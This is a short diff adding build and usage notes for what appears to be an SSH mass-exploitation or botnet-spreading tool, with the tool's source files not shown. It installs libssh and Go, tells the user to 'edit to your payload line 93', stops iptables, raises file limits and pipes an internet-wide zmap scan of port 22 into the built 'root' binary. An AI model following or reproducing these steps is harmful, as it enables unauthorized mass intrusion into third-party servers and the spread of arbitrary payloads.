@@ -1,0 +1,27 @@
+//.c
+sudo apt-get install gcc
+sudo apt-get install libssh-dev
+gcc -o x86 x86.c -lssh -lpthread
+
+///reqs
+
+yum install git -y
+cd /tmp
+wget https://go.dev/dl/go1.21.3.linux-amd64.tar.gz
+sudo tar -C /usr/local -xzf go1.21.3.linux-amd64.tar.gz
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/go
+export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
+mv go /usr/local
+go version
+go env
+cd ~/
+go get golang.org/x/crypto/ssh
+
+
+///how to use
+edit to your payload line 93
+go build root.go
+sudo service iptables stop
+ulimit -n 999999
+zmap -p22 | ./root
